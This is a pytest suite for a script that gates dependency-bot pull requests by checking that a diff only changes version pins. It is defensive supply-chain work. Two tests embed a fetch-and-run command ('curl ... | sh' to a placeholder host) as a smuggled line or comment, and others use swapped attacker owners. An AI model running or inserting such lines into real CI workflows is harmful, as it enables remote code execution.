"""Tests for scripts/assert-pin-only-diff.py.

This is the check that stands between a dependency bot's pull request and an
unattended merge, so what it refuses matters as much as what it accepts. The
refusal cases below are the ones that would otherwise turn "approve because the
author is renovate[bot]" into write access to main.

No containers and no stack state, so these run anywhere:
    pytest -m scripts tests/test_assert_pin_only_diff.py
"""

import subprocess

import pytest

from conftest import REPO_ROOT

pytestmark = pytest.mark.scripts

SCRIPT = REPO_ROOT / "scripts" / "assert-pin-only-diff.py"

DIGEST = "sha256:" + "a" * 64


def _check(diff: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        ["python3", str(SCRIPT)],
        input=diff,
        capture_output=True,
        text=True,
        timeout=60,
    )


def _diff(path: str, body: str, *, header: str = "") -> str:
    return (
        f"diff --git a/{path} b/{path}\n"
        f"{header}"
        f"--- a/{path}\n"
        f"+++ b/{path}\n"
        "@@ -1,3 +1,3 @@\n"
        f"{body}"
    )


# ---------------------------------------------------------------------------
# Accepted: a version or digest moved, and nothing else did
# ---------------------------------------------------------------------------


def test_accepts_an_image_version_and_digest_bump():
    result = _check(
        _diff(
            ".env.example",
            f"-PROMETHEUS_VERSION=v3.7.3@{DIGEST}\n"
            f"+PROMETHEUS_VERSION=v3.7.4@{DIGEST}\n",
        )
    )
    assert result.returncode == 0, result.stdout


def test_accepts_a_pip_pin_bump_inside_a_workflow_run_step():
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            "-          pip install checkov==3.3.2\n"
            "+          pip install checkov==3.3.11\n",
        )
    )
    assert result.returncode == 0, result.stdout


def test_accepts_a_first_time_digest_pin():
    # pinDigests adds a digest to a line that had none, so the two sides differ
    # by its presence. Refusing that would block every pin Renovate creates.
    result = _check(
        _diff(
            ".env.example",
            f"-PROMETHEUS_VERSION=v3.7.3\n+PROMETHEUS_VERSION=v3.7.3@{DIGEST}\n",
        )
    )
    assert result.returncode == 0, result.stdout


def test_accepts_a_hook_rev_bump():
    result = _check(
        _diff(
            ".pre-commit-config.yaml",
            "-    rev: v0.16.1\n+    rev: v0.16.2\n",
        )
    )
    assert result.returncode == 0, result.stdout


# ---------------------------------------------------------------------------
# A GitHub Actions SHA pin's trailing release comment normalizes with it
# ---------------------------------------------------------------------------


def test_accepts_a_github_action_sha_and_comment_bump():
    # The bug this guards: the dependency bot rewrites both halves on a real
    # bump, so the comment moving from `# v7` to `# v7.0.1` alongside the SHA
    # must not read as a structural change. The leading `- name:` line is
    # real diff context, mirroring what `gh pr diff` always carries: without
    # it, _in_block_scalar has nothing to judge from and conservatively
    # refuses.
    result = _check(
        _diff(
            ".github/workflows/coderabbit-gate.yml",
            "       - name: Checkout\n"
            "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
            "+        uses: actions/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f # v7.0.1\n",
        )
    )
    assert result.returncode == 0, result.stdout


def test_accepts_a_github_action_sha_only_bump():
    # The SHA moves, the comment does not: a digest-only refresh of a release
    # that the dependency bot did not consider a new tag.
    result = _check(
        _diff(
            ".github/workflows/coderabbit-gate.yml",
            "       - name: Checkout\n"
            "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
            "+        uses: actions/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f # v7\n",
        )
    )
    assert result.returncode == 0, result.stdout


def test_refuses_a_github_action_swapped_owner_despite_a_matching_comment():
    result = _check(
        _diff(
            ".github/workflows/coderabbit-gate.yml",
            "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
            "+        uses: evil/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f # v7\n",
        )
    )
    assert result.returncode == 1


def test_refuses_a_non_release_comment_change():
    result = _check(
        _diff(
            ".github/workflows/coderabbit-gate.yml",
            "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
            "+        uses: actions/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f # pinned\n",
        )
    )
    assert result.returncode == 1


def test_refuses_a_comment_smuggling_extra_text_after_a_version_token():
    result = _check(
        _diff(
            ".github/workflows/coderabbit-gate.yml",
            "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
            "+        uses: actions/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f"
            " # v7.0.1 && curl -s https://example.invalid/x.sh | sh\n",
        )
    )
    assert result.returncode == 1


def test_refuses_a_comment_appearing_where_there_was_none():
    result = _check(
        _diff(
            ".github/workflows/coderabbit-gate.yml",
            "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n"
            "+        uses: actions/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f # v7\n",
        )
    )
    assert result.returncode == 1


# ---------------------------------------------------------------------------
# A first-time GitHub Actions pin normalizes with the bare ref it replaces
# ---------------------------------------------------------------------------


def test_accepts_a_first_time_github_action_pin():
    # #178: pinDigests adding a SHA and release comment to a previously
    # unpinned action, refused before this normalized, despite being nothing
    # but the pin Renovate's own update type exists to add.
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            "       - name: Checkout\n"
            "-        uses: actions/checkout@v7\n"
            "+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
            " # v7\n",
        )
    )
    assert result.returncode == 0, result.stdout


def test_accepts_a_first_time_pin_alongside_a_tag_bump():
    # The release comment does not have to match the old bare tag exactly;
    # Renovate can pin straight to a newer release than the one that was
    # sitting there unpinned, the same as an ordinary bump would.
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            "       - name: Checkout\n"
            "-        uses: actions/checkout@v7\n"
            "+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
            " # v7.0.1\n",
        )
    )
    assert result.returncode == 0, result.stdout


def test_accepts_an_uppercase_first_time_pin():
    # GitHub resolves a uses: SHA the same way regardless of case.
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            "       - name: Checkout\n"
            "-        uses: actions/checkout@v7\n"
            "+        uses: actions/checkout@3D3C42E5AAC5BA805825DA76410C181273BA90B1"
            " # v7\n",
        )
    )
    assert result.returncode == 0, result.stdout


def test_refuses_a_non_hex_40_character_token_as_a_first_time_pin():
    # A third finding on this pattern: RELEASE accepts any alphanumeric
    # run, hex or not, so a 40 character token that is not real hex slips
    # past ACTION_SHA (not hex) and was accepted here regardless, since
    # nothing checked that a first-time pin's target was ever a real SHA.
    # 40 characters is the shape ACTION_SHA exists to own exclusively, so
    # anything that length reaching this pattern is refused outright.
    fake = "0" + "z" * 39
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            f"-        uses: actions/checkout@v7\n"
            f"+        uses: actions/checkout@{fake} # v7\n",
        )
    )
    assert result.returncode == 1


def test_refuses_a_first_time_pin_with_a_swapped_owner():
    # The dependency name stays literal to the left of the `@` for this shape
    # exactly as it does for every other pin type here.
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            "-        uses: actions/checkout@v7\n"
            "+        uses: evil/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
            " # v7\n",
        )
    )
    assert result.returncode == 1


def test_accepts_a_first_time_pin_as_a_yaml_list_item():
    # A step is also legally written as a bare list item, `- uses: ...`,
    # with no name: line above it. The anchor has to allow the optional
    # marker, not just plain indentation.
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            "     steps:\n"
            "-      - uses: actions/checkout@v7\n"
            "+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
            " # v7\n",
        )
    )
    assert result.returncode == 0, result.stdout


def test_refuses_a_first_time_pin_with_no_visible_context():
    # _in_block_scalar has nothing to judge from when the diff shows no
    # line shallower than the change at all (a synthetic edge case a real
    # gh pr diff essentially never produces, since it always carries a
    # line or two of context), and conservatively refuses rather than
    # guess, the same fail closed direction every other shape here takes.
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            "-        uses: actions/checkout@v7\n"
            "+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
            " # v7\n",
        )
    )
    assert result.returncode == 1


def test_refuses_uses_embedded_in_a_run_step_disguised_as_a_first_time_pin():
    # A follow-up CodeRabbit finding on this exact pattern: \buses: is a
    # word-boundary check, not a position check, so it matched the
    # substring "uses:" anywhere on the line, including inside a run:
    # step's own text. Confirmed exploitable before this fix: this exact
    # diff normalized as Pin-only.
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            "-          run: uses: actions/checkout@v7\n"
            "+          run: uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
            " # v7\n",
        )
    )
    assert result.returncode == 1


def test_refuses_a_run_step_version_bump_disguised_as_a_first_time_pin():
    # CodeRabbit's finding on this pull request: an unscoped version of
    # BARE_ACTION_VERSION would let a run: step's trailing tool@v7 normalize
    # the same way a first-time action pin does, so it could grow an
    # unrelated-looking SHA and comment and still read as pin-only. Requiring
    # a uses: field and an owner/repo coordinate immediately before the `@`
    # closes that: this line has neither.
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            "-          run: tool@v7\n"
            "+          run: tool@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n",
        )
    )
    assert result.returncode == 1


def test_refuses_a_first_time_pin_missing_its_release_comment():
    # A bare SHA with nothing trailing it normalizes to "" (ACTION_SHA), not
    # to the " # <version>" a first-time pin's bare side produces, so the two
    # still do not match: Renovate always adds the comment on this update
    # type, and a diff missing it has changed something this script cannot
    # account for as a plain pin.
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            "-        uses: actions/checkout@v7\n"
            "+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n",
        )
    )
    assert result.returncode == 1


# ---------------------------------------------------------------------------
# Refused: anything else, including alongside a legitimate bump
# ---------------------------------------------------------------------------


def test_refuses_a_line_smuggled_in_beside_a_real_bump():
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            "-          pip install checkov==3.3.2\n"
            "+          pip install checkov==3.3.11\n"
            "+          curl -s https://example.invalid/x.sh | sh\n",
        )
    )
    assert result.returncode == 1
    assert "was not a version bump" in result.stdout


def test_refuses_a_swapped_name_at_the_same_version():
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            "-        uses: actions/checkout@v7\n+        uses: attacker/checkout@v7\n",
        )
    )
    assert result.returncode == 1


def test_refuses_a_file_outside_the_pin_paths():
    result = _check(
        _diff(
            "docker-compose-torrent.yml",
            "-    image: lscr.io/linuxserver/sonarr:4.0.19\n"
            "+    image: lscr.io/linuxserver/sonarr:4.0.20\n",
        )
    )
    assert result.returncode == 1
    assert "not a dependency pin file" in result.stdout


def test_refuses_a_new_file_even_in_an_allowed_path():
    result = _check(
        _diff(
            ".github/workflows/extra.yml",
            "+name: extra\n",
            header="new file mode 100644\n",
        )
    )
    assert result.returncode == 1
    assert "new file mode" in result.stdout


def test_refuses_a_rename():
    result = _check(
        "diff --git a/tests/requirements.txt b/tests/requirements-old.txt\n"
        "--- a/tests/requirements.txt\n"
        "+++ b/tests/requirements-old.txt\n"
    )
    assert result.returncode == 1
    assert "renamed to" in result.stdout


def test_refuses_an_empty_diff():
    # A pull request whose diff cannot be read must not read as "nothing wrong
    # with it", which is what an empty allowlist check would have concluded.
    result = _check("")
    assert result.returncode == 1
    assert "empty" in result.stdout


# ---------------------------------------------------------------------------
# Fails closed: the ways an unreadable diff could have passed for a clean one
# ---------------------------------------------------------------------------


def test_refuses_output_with_no_file_header():
    # Truncated or binary output parses into no files at all. Reporting that as
    # "nothing to object to" would approve a diff nobody managed to read.
    result = _check("Binary files a/x.png and b/x.png differ\n")
    assert result.returncode == 1
    assert "no file headers" in result.stdout


def test_refuses_a_file_whose_lines_could_not_be_read():
    result = _check(
        "diff --git a/.env.example b/.env.example\nindex 1111111..2222222 100644\n"
    )
    assert result.returncode == 1
    assert "no readable changed lines" in result.stdout


def test_counts_an_added_line_that_looks_like_a_file_header():
    # `+++x` inside a hunk is an added line reading `++x`. Skipping it as a
    # ---/+++ header would drop it from the comparison, so the smuggled line
    # would never be seen.
    result = _check(
        _diff(
            ".env.example",
            "-PROMETHEUS_VERSION=v3.7.3\n"
            "+PROMETHEUS_VERSION=v3.7.4\n"
            "+++PATH=/tmp/evil\n",
        )
    )
    assert result.returncode == 1
    assert "was not a version bump" in result.stdout


# ---------------------------------------------------------------------------
# Only a number in a pin position counts as a version
# ---------------------------------------------------------------------------


def test_refuses_a_numeric_change_that_is_not_a_pin():
    # PUID=0 would run every container as root, and it is a digit change on a
    # line in an allowed file, so a rule that normalized any number would have
    # accepted it.
    result = _check(_diff(".env.example", "-PUID=1000\n+PUID=0\n"))
    assert result.returncode == 1


def test_refuses_a_changed_yaml_number():
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            "-    timeout-minutes: 25\n+    timeout-minutes: 600\n",
        )
    )
    assert result.returncode == 1


def test_refuses_a_pin_that_changes_shape_rather_than_value():
    result = _check(
        _diff(
            "tests/requirements.txt",
            "-pytest==8.4.1\n+pytest>=8.4.1\n",
        )
    )
    assert result.returncode == 1


def test_accepts_a_hash_style_tag():
    # linuxserver publishes lazylibrarian as a commit hash with a build suffix,
    # not as dotted numbers. Refusing that meant refusing a real bump, which is
    # what happened to #62.
    result = _check(
        _diff(
            ".env.example",
            # pragma: allowlist secret - an image tag, and the hash in it is
            # what detect-secrets reads as entropy. It is published on Docker
            # Hub.
            "-LAZYLIBRARIAN_VERSION=40a389ea-ls309\n"  # pragma: allowlist secret
            "+LAZYLIBRARIAN_VERSION=40a389ea-ls310\n",  # pragma: allowlist secret
        )
    )
    assert result.returncode == 0, result.stdout


def test_still_refuses_a_non_pin_number_after_widening_the_token():
    # The widened token must not start accepting numbers that are not pins.
    result = _check(_diff(".env.example", "-PUID=1000\n+PUID=0\n"))
    assert result.returncode == 1


def test_accepts_a_sha_prefixed_tag():
    # korsync was pinned to `sha-<hash>` when this case was written, so the
    # token cannot be required to start with a digit. Requiring one refused this
    # form. korsync has since moved to a plain `0.2.3`, and the literal stays
    # here rather than being read from .env.example so that the shape is tested
    # whatever the file happens to pin: what is under test is the script's
    # tolerance for the form, not that anything currently uses it.
    old = "sha-7bcefd34e9f6738ce34ccda338aedd316baa05c9"  # pragma: allowlist secret
    new = "sha-8adf1129c7a0d51e0b2a7f4e93a1b0c5d6e7f809"  # pragma: allowlist secret
    result = _check(
        _diff(".env.example", f"-KORSYNC_VERSION={old}\n+KORSYNC_VERSION={new}\n")
    )
    assert result.returncode == 0, result.stdout


def test_accepts_a_floating_tag_change():
    result = _check(
        _diff(".env.example", "-NGINX_VERSION=stable-alpine\n+NGINX_VERSION=stable\n")
    )
    assert result.returncode == 0, result.stdout


def test_still_refuses_a_swapped_image_name_with_the_widest_token():
    # The name sits left of the prefix and stays literal, which is what keeps
    # the permissive token safe.
    result = _check(
        _diff(
            ".pre-commit-config.yaml",
            "-        entry: docker run aquasec/trivy:0.71.2\n"
            "+        entry: docker run attacker/trivy:0.71.2\n",
        )
    )
    assert result.returncode == 1


def test_accepts_a_tool_versions_bump():
    # .tool-versions writes `<tool> <version>` with only a space between them,
    # which none of the prefix rules can see. #67 was refused for it.
    result = _check(_diff(".tool-versions", "-pre-commit 4.5.1\n+pre-commit 4.6.2\n"))
    assert result.returncode == 0, result.stdout


def test_refuses_a_swapped_tool_name_in_tool_versions():
    result = _check(
        _diff(".tool-versions", "-pre-commit 4.5.1\n+attacker-tool 4.5.1\n")
    )
    assert result.returncode == 1


def test_refuses_an_extra_tool_added_to_tool_versions():
    result = _check(
        _diff(".tool-versions", "-pre-commit 4.5.1\n+pre-commit 4.6.2\n+evil 1.0.0\n")
    )
    assert result.returncode == 1


def test_accepts_a_pip_floor_bump_in_test_requirements():
    # tests/requirements.txt pins floors with `>=`, not exact versions with
    # `==`, and `>=` was missing from the prefix set until PR #94 sat failing
    # `Pin Only` on it. Every line in that file uses it, so no bump of it could
    # ever have graded pin-only.
    result = _check(_diff("tests/requirements.txt", "-json5>=0.12.1\n+json5>=0.15.0\n"))
    assert result.returncode == 0, result.stdout


def test_refuses_a_swapped_package_name_on_a_floor_pin():
    result = _check(
        _diff("tests/requirements.txt", "-json5>=0.12.1\n+attacker>=0.15.0\n")
    )
    assert result.returncode == 1


def test_refuses_a_floor_pin_becoming_an_exact_pin():
    # The prefix is captured and put back, so changing the pin's shape is a
    # difference even when the package and the version are both plausible.
    result = _check(_diff("tests/requirements.txt", "-json5>=0.12.1\n+json5==0.15.0\n"))
    assert result.returncode == 1


# ---------------------------------------------------------------------------
# A uses: line inside a run: | block scalar is not a real GitHub Actions
# field, and no pattern here may treat it as a pin
# ---------------------------------------------------------------------------


def test_refuses_a_first_time_pin_disguise_inside_a_run_step():
    # A CodeRabbit review found and confirmed this: normalize() has no YAML
    # awareness, so an indented uses: line inside a run: | block, plain
    # shell text, matched ACTION_SHA and BARE_ACTION_VERSION the same way a
    # real GitHub Actions uses: field does.
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            "       - name: Something\n"
            "         run: |\n"
            "           echo hello\n"
            "-          uses: fake/action@v7\n"
            "+          uses: fake/action@3d3c42e5aac5ba805825da76410c181273ba90b1"
            " # v7\n",
        )
    )
    assert result.returncode == 1


def test_refuses_a_bare_tag_disguise_inside_a_run_step():
    # A second gap the same review surfaced: skipping ACTION_SHA and
    # BARE_ACTION_VERSION for a block scalar line was not enough on its
    # own here, because VERSION's own @ prefix independently matched the
    # same uses: owner/repo@version shape, with no SHA or comment
    # involved at all. Confirmed exploitable before ACTION_REF_VERSION
    # split that prefix out and gated it the same way: this exact diff
    # read as Pin-only.
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            "       - name: Something\n"
            "         run: |\n"
            "           echo hello\n"
            "-          uses: fake/action@v7\n"
            "+          uses: fake/action@v8\n",
        )
    )
    assert result.returncode == 1


def test_accepts_a_pip_pin_bump_inside_a_block_scalar_run_step():
    # The block scalar check must not cost this repository's own
    # documented shape: a pip pin bump legitimately lives inside a run: |
    # step (see VERSION's own comment), and has nothing to do with the
    # uses: disguise the check above exists to catch.
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            "      - name: Install\n"
            "        run: |\n"
            "-          pip install checkov==3.3.2\n"
            "+          pip install checkov==3.3.11\n",
        )
    )
    assert result.returncode == 0, result.stdout


def test_accepts_a_floating_tag_bump_outside_a_block_scalar():
    # An action that has never been SHA-pinned can still move from one
    # floating tag to another; ACTION_REF_VERSION covers this ordinary
    # case (distinct from a first-time pin, which BARE_ACTION_VERSION
    # covers), and it is not inside a block scalar here, so it still
    # normalizes and accepts.
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            "      - name: Checkout\n"
            "-        uses: actions/checkout@v7\n"
            "+        uses: actions/checkout@v7.1.0\n",
        )
    )
    assert result.returncode == 0, result.stdout


def test_refuses_an_action_ref_disguise_outside_a_block_scalar():
    # A CodeRabbit review found ACTION_REF_VERSION itself was still
    # unscoped: its own bare `@` prefix matched anywhere on a line, block
    # scalar or not, so a plain single-line `run:` step's own text with
    # an `@version`-shaped token normalized the same way a real `uses:`
    # field does, with no block scalar and no `uses:` field involved at
    # all. Confirmed exploitable before ACTION_REF_VERSION was anchored
    # to a genuine `uses:` field: this exact diff read as Pin-only.
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            "      - name: Run\n"
            "-        run: echo fake/action@v7\n"
            "+        run: echo fake/action@v8\n",
        )
    )
    assert result.returncode == 1


def test_refuses_a_first_time_pin_disguise_inside_a_sequence_item_scalar():
    # A CodeRabbit review found BLOCK_SCALAR_OPENER itself was still too
    # narrow: it required a colon before the scalar indicator, so a bare
    # sequence-item header with no key in front, `- |`, was not
    # recognized as opening a block scalar. A uses: line nested under one
    # then reached pin normalization as ordinary YAML structure instead
    # of literal block scalar content. Confirmed exploitable before
    # BLOCK_SCALAR_OPENER also matched a standalone sequence-item header.
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            "        scripts:\n"
            "          - |\n"
            "-            uses: fake/action@v7\n"
            "+            uses: fake/action@v8\n",
        )
    )
    assert result.returncode == 1
